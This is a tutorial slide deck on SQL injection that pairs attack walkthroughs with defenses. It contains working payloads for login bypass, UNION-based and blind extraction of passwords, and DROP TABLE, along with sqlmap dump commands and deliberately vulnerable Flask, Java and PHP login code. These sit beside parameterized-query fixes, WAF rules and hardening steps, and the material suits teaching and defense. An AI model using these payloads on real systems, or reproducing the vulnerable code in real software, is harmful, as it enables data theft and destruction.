# SQL Injection
---
## What is SQL Injection?
- A technique to exploit web applications by injecting malicious SQL statements
- Attacker can gain unauthorized access to databases
- Can lead to data theft, data manipulation, or even server takeover
- Consistently ranked #1 or top 3 in OWASP Top 10 since 2003
---
## How Does SQL Injection Work?

<svg width="600" height="200" xmlns="http://www.w3.org/2000/svg">
  <text x="300" y="15" text-anchor="middle" font-size="12" font-weight="bold">SQL Injection Attack Flow</text>
  <rect x="20" y="30" width="110" height="50" fill="#e3f2fd" stroke="#1565c0" stroke-width="2" rx="5"/>
  <text x="75" y="52" text-anchor="middle" font-size="10" font-weight="bold">Attacker</text>
  <text x="75" y="68" text-anchor="middle" font-size="9" fill="#c62828">' OR '1'='1</text>
  <rect x="180" y="30" width="130" height="50" fill="#fff3e0" stroke="#e65100" stroke-width="2" rx="5"/>
  <text x="245" y="50" text-anchor="middle" font-size="10" font-weight="bold">Web App</text>
  <text x="245" y="68" text-anchor="middle" font-size="9" fill="#e65100">No input validation</text>
  <rect x="360" y="30" width="120" height="50" fill="#ffebee" stroke="#c62828" stroke-width="2" rx="5"/>
  <text x="420" y="50" text-anchor="middle" font-size="10" font-weight="bold" fill="#c62828">SQL Engine</text>
  <text x="420" y="68" text-anchor="middle" font-size="9" fill="#c62828">Executes malicious</text>
  <rect x="510" y="30" width="80" height="50" fill="#e8f5e9" stroke="#2e7d32" stroke-width="2" rx="5"/>
  <text x="550" y="52" text-anchor="middle" font-size="10" font-weight="bold">Database</text>
  <text x="550" y="68" text-anchor="middle" font-size="9" fill="#c62828">Data leaked</text>
  <line x1="130" y1="55" x2="178" y2="55" stroke="#c62828" stroke-width="2" marker-end="url(#arrowsqli)"/>
  <line x1="310" y1="55" x2="358" y2="55" stroke="#c62828" stroke-width="2" marker-end="url(#arrowsqli)"/>
  <line x1="480" y1="55" x2="508" y2="55" stroke="#c62828" stroke-width="2" marker-end="url(#arrowsqli)"/>
  <rect x="100" y="100" width="400" height="40" fill="#fff3e0" stroke="#e65100" stroke-width="1" rx="3"/>
  <text x="300" y="117" text-anchor="middle" font-size="10" fill="#e65100">SELECT * FROM users WHERE name='' OR '1'='1' --'</text>
  <text x="300" y="132" text-anchor="middle" font-size="9" fill="#c62828">Unsanitized input becomes part of SQL query</text>
  <rect x="100" y="150" width="400" height="40" fill="#e8f5e9" stroke="#2e7d32" stroke-width="1" rx="3"/>
  <text x="300" y="167" text-anchor="middle" font-size="10" fill="#2e7d32">SELECT * FROM users WHERE name=? (parameterized)</text>
  <text x="300" y="182" text-anchor="middle" font-size="9" fill="#2e7d32">Safe: input treated as data, not code</text>
  <defs>
    <marker id="arrowsqli" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
      <path d="M0,0 L0,6 L9,3 z" fill="#c62828"/>
    </marker>
  </defs>
</svg>

---
## How Does SQL Injection Work?
1. User input is not properly sanitized
1. Malicious SQL code is injected into application queries
1. Injected code is executed by the database
1. Attacker can retrieve, modify, or delete data

---
## Types of SQL Injection

| Type          | Description                                  | Visibility |
|---------------|----------------------------------------------|------------|
| In-band       | Results returned directly in response        | High       |
| Error-based   | Database errors reveal information           | Medium     |
| UNION-based   | UNION queries extract additional data        | High       |
| Blind Boolean | True/false responses infer data              | Low        |
| Blind Time    | Response timing reveals data                 | Low        |
| Out-of-band   | Data sent via DNS/HTTP to attacker server    | None       |

---
## Examples of SQL Injection
- Login bypass: `' OR '1'='1`
- Retrieving data: `UNION SELECT password FROM users`
- Adding data: `'; INSERT INTO users VALUES ('admin', 'password')`
- Deleting data: `'; DROP TABLE users; --`

---
## Step-by-Step: Authentication Bypass

```sql
-- Application code builds this query:
SELECT * FROM users WHERE username='INPUT' AND password='INPUT';

-- Attacker enters username: admin' --
-- Resulting query:
SELECT * FROM users WHERE username='admin' --' AND password='';
-- The -- comments out the password check!
-- Attacker logs in as admin without knowing the password.

-- Attacker enters username: ' OR 1=1 --
-- Resulting query:
SELECT * FROM users WHERE username='' OR 1=1 --' AND password='';
-- Returns ALL users - attacker gets the first row (often admin)
```

---
## Step-by-Step: UNION-Based Data Extraction

```sql
-- Original query:
SELECT name, price FROM products WHERE id=INPUT;

-- Step 1: Determine number of columns
' ORDER BY 1 --     (works)
' ORDER BY 2 --     (works)
' ORDER BY 3 --     (error - only 2 columns)

-- Step 2: Find displayable columns
' UNION SELECT 'test1', 'test2' --

-- Step 3: Extract database metadata
' UNION SELECT table_name, NULL FROM information_schema.tables --

-- Step 4: Extract column names
' UNION SELECT column_name, NULL
  FROM information_schema.columns
  WHERE table_name='users' --

-- Step 5: Extract actual data
' UNION SELECT username, password FROM users --
```

---
## Blind SQL Injection: Boolean-Based

When the application does not show query results but behaves differently for true/false:

```sql
-- Test if first character of admin password is 'a'
' AND (SELECT SUBSTRING(password,1,1)
       FROM users WHERE username='admin') = 'a' --

-- If the page loads normally: character is 'a'
-- If the page shows error/empty: character is not 'a'

-- Automated extraction character by character:
-- Position 1: test a,b,c,...z,0-9 -> found 'p'
-- Position 2: test a,b,c,...z,0-9 -> found 'a'
-- Position 3: test a,b,c,...z,0-9 -> found 's'
-- ... eventually: password = 'pa$$w0rd'
```

This is slow but fully automated by tools like sqlmap.

---
## Blind SQL Injection: Time-Based

When there is no visible difference in response:

```sql
-- MySQL: IF condition is true, sleep 5 seconds
' AND IF(1=1, SLEEP(5), 0) --
-- If response takes ~5 seconds: injection works!

-- Extract data using timing:
' AND IF(
    (SELECT SUBSTRING(password,1,1)
     FROM users WHERE username='admin') = 'a',
    SLEEP(5), 0) --
-- 5 second delay = character is 'a'
-- Instant response = character is not 'a'

-- PostgreSQL equivalent:
' AND (SELECT CASE WHEN (1=1)
       THEN pg_sleep(5) ELSE pg_sleep(0) END) --
```

---
## Second-Order SQL Injection

<svg xmlns="http://www.w3.org/2000/svg" width="660" height="340" font-family="sans-serif">
  <defs>
    <marker id="arr" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
      <polygon points="0 0, 10 3.5, 0 7" fill="#555"/>
    </marker>
  </defs>
  <!-- outer border -->
  <rect x="5" y="5" width="650" height="330" fill="#fff8e1" stroke="#e65100" stroke-width="2" rx="6"/>
  <text x="320" y="28" font-size="15" font-weight="bold" fill="#e65100" text-anchor="middle">Second-Order SQL Injection</text>
  <!-- Step 1 -->
  <text x="15" y="52" font-size="13" font-weight="bold" fill="#222">Step 1: Register username: admin'--</text>
  <rect x="15" y="60" width="100" height="36" fill="#e3f2fd" stroke="#333" stroke-width="1.5" rx="3"/>
  <text x="65" y="83" font-size="12" fill="#222" text-anchor="middle">Attacker</text>
  <line x1="115" y1="78" x2="131" y2="78" stroke="#555" stroke-width="1.5" marker-end="url(#arr)"/>
  <rect x="133" y="60" width="110" height="36" fill="#fff3e0" stroke="#333" stroke-width="1.5" rx="3"/>
  <text x="188" y="83" font-size="12" fill="#222" text-anchor="middle">Sign Up Form</text>
  <line x1="243" y1="78" x2="259" y2="78" stroke="#555" stroke-width="1.5" marker-end="url(#arr)"/>
  <rect x="261" y="60" width="120" height="36" fill="#e8f5e9" stroke="#333" stroke-width="1.5" rx="3"/>
  <text x="321" y="78" font-size="12" fill="#222" text-anchor="middle">Database</text>
  <text x="321" y="90" font-size="11" fill="#2e7d32" text-anchor="middle">Stored!</text>
  <!-- Step 2 -->
  <text x="15" y="125" font-size="13" font-weight="bold" fill="#222">Step 2: Password reset uses stored username</text>
  <rect x="15" y="133" width="100" height="36" fill="#e3f2fd" stroke="#333" stroke-width="1.5" rx="3"/>
  <text x="65" y="156" font-size="12" fill="#222" text-anchor="middle">Attacker</text>
  <line x1="115" y1="151" x2="131" y2="151" stroke="#555" stroke-width="1.5" marker-end="url(#arr)"/>
  <rect x="133" y="133" width="110" height="36" fill="#fff3e0" stroke="#333" stroke-width="1.5" rx="3"/>
  <text x="188" y="151" font-size="12" fill="#222" text-anchor="middle">Reset Password</text>
  <text x="188" y="163" font-size="11" fill="#888" text-anchor="middle">uses stored name</text>
  <line x1="243" y1="151" x2="259" y2="151" stroke="#555" stroke-width="1.5" marker-end="url(#arr)"/>
  <rect x="261" y="133" width="120" height="36" fill="#ffebee" stroke="#c62828" stroke-width="1.5" rx="3"/>
  <text x="321" y="151" font-size="12" fill="#c62828" text-anchor="middle">Database</text>
  <text x="321" y="163" font-size="11" fill="#c62828" text-anchor="middle">Injection!</text>
  <!-- SQL query -->
  <rect x="15" y="195" width="620" height="56" fill="#fce4ec" stroke="#c62828" stroke-width="1.5" rx="4"/>
  <text x="25" y="215" font-size="13" fill="#222" font-family="monospace">UPDATE users SET password='newpass'</text>
  <text x="25" y="233" font-size="13" fill="#222" font-family="monospace">WHERE username='admin'--'</text>
  <!-- Result -->
  <rect x="15" y="265" width="620" height="60" fill="#ffcdd2" stroke="#c62828" stroke-width="2" rx="4"/>
  <text x="320" y="288" font-size="13" font-weight="bold" fill="#c62828" text-anchor="middle">⚠ Resets ADMIN's password — not the attacker's!</text>
  <text x="320" y="310" font-size="12" fill="#555" text-anchor="middle">The -- comment causes the closing quote to be ignored, modifying a different row.</text>
</svg>

---
## Vulnerable Code: Multiple Languages

### Python (Flask + SQLite)

```python
# VULNERABLE: String concatenation
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    user = db.execute(query).fetchone()
    if user:
        session['user'] = user['username']
        return redirect('/dashboard')
    return 'Invalid credentials'
```

### Java (JDBC)

```java
// VULNERABLE: String concatenation in JDBC
String query = "SELECT * FROM users WHERE username='"
    + username + "' AND password='" + password + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

### PHP

```php
// VULNERABLE: Direct variable interpolation
$query = "SELECT * FROM users WHERE username='$username'
          AND password='$password'";
$result = mysqli_query($conn, $query);
```

---
## Preventing SQL Injection
1. **Input Validation**: Validate and sanitize user input
1. **Parameterized Queries**: Use parameterized queries or prepared statements
1. **Least Privileged Accounts**: Use database accounts with minimal privileges
1. **Web Application Firewalls (WAF)**: Deploy a WAF to filter malicious input
1. **Security Updates**: Keep your software and libraries up-to-date
---
## Parameterized Queries

```python
# Insecure query
query = "SELECT * FROM users WHERE name = '" + username + "';"

# Secure parameterized query
query = "SELECT * FROM users WHERE name = ?;"
cursor.execute(query, (username,))
```

---
## Parameterized Queries: All Languages

### Python (SQLAlchemy ORM - recommended)
```python
# Using ORM - no raw SQL at all
user = User.query.filter_by(username=username).first()

# Using SQLAlchemy text with parameters
from sqlalchemy import text
result = db.execute(
    text("SELECT * FROM users WHERE username = :name"),
    {"name": username}
)
```

### Java (Prepared Statement)
```java
String query = "SELECT * FROM users WHERE username=? AND password=?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
```

### PHP (PDO)
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :user AND password = :pass");
$stmt->execute(['user' => $username, 'pass' => $password]);
$user = $stmt->fetch();
```

### Node.js (pg library)
```javascript
const query = 'SELECT * FROM users WHERE username = $1 AND password = $2';
const result = await pool.query(query, [username, password]);
```

---
## Stored Procedures (Additional Defense Layer)

```sql
-- Create a stored procedure for login
CREATE PROCEDURE sp_authenticate(
    IN p_username VARCHAR(50),
    IN p_password VARCHAR(255)
)
BEGIN
    SELECT user_id, username, role
    FROM users
    WHERE username = p_username
    AND password_hash = SHA2(p_password, 256);
END;

-- Call from application (still use parameterized!)
-- cursor.callproc('sp_authenticate', (username, password))
```

Note: Stored procedures alone do not prevent SQLi if they use dynamic SQL internally.

---
## Sanitizing User Input
- Remove or escape special characters (', ", `, etc.)
- Use allowlists (whitelisting) instead of denylists (blacklisting)
- Apply strong input validation rules
- Avoid interpreting input as executable code

---
## Real-World SQL Injection Incidents

| Incident             | Year | Impact                                 |
|---------------------|------|----------------------------------------|
| Heartland Payment   | 2008 | 134 million credit cards stolen         |
| Sony PlayStation    | 2011 | 77 million accounts compromised        |
| Yahoo               | 2012 | 450,000 credentials leaked             |
| TalkTalk            | 2015 | 157,000 customer records, 60M GBP fine |
| Equifax             | 2017 | 147 million records (via Struts vuln)  |

---
## Detection and Testing Tools

```bash
# sqlmap - Automated SQL injection detection and exploitation
# (for authorized penetration testing only)
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# OWASP ZAP - Web application scanner
# Includes SQL injection detection rules

# Burp Suite - Intercept and modify requests
# Use Intruder with SQLi payload lists

# Static analysis
# Python: bandit -r myapp/
# Java: FindBugs / SpotBugs with FindSecBugs plugin
# PHP: phpcs with security-audit standard
```

---
## WAF Rules for SQL Injection

```sql
# ModSecurity CRS rules for SQL injection detection
# Common patterns blocked:
# - UNION SELECT
# - OR 1=1
# - Single quotes followed by SQL keywords
# - Comment sequences (-- or /*)
# - Hex-encoded SQL keywords

# Example custom rule:
SecRule ARGS "@detectSQLi" \
    "id:1002,\
    phase:2,\
    deny,\
    status:403,\
    log,\
    msg:'SQL Injection Attempt Detected'"
```

---
## Database Hardening

```sql
-- Create application-specific database user with minimal privileges
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';

-- Grant only necessary permissions
GRANT SELECT, INSERT, UPDATE ON myapp.users TO 'webapp'@'localhost';
GRANT SELECT ON myapp.products TO 'webapp'@'localhost';

-- NEVER grant these to application accounts:
-- GRANT ALL PRIVILEGES
-- GRANT FILE (allows reading server files)
-- GRANT PROCESS (allows seeing other queries)
-- GRANT SUPER (allows killing queries, changing config)

-- Disable dangerous functions
-- MySQL: SET GLOBAL local_infile = 0;
-- PostgreSQL: Restrict pg_read_file, pg_ls_dir
```

---
## Best Practices
- Follow the principle of "least privilege" for database accounts
- Implement secure authentication and access control mechanisms
- Keep software up-to-date with security patches and updates
- Regularly audit and test your applications for SQL Injection vulnerabilities
- Educate developers on secure coding practices and SQL Injection prevention

---
## Exercise: SQL Injection Lab

1. Set up a vulnerable login form using Flask + SQLite
2. Demonstrate these attack types:
   - Authentication bypass with `' OR 1=1 --`
   - UNION-based extraction of all usernames and passwords
   - Time-based blind injection to extract the admin password character by character
3. Use sqlmap to automate the extraction
4. Fix the application using parameterized queries
5. Add a WAF layer and test that previous attacks are blocked
6. Implement database-level hardening (least privilege user)
7. Compare the before/after security with OWASP ZAP scans
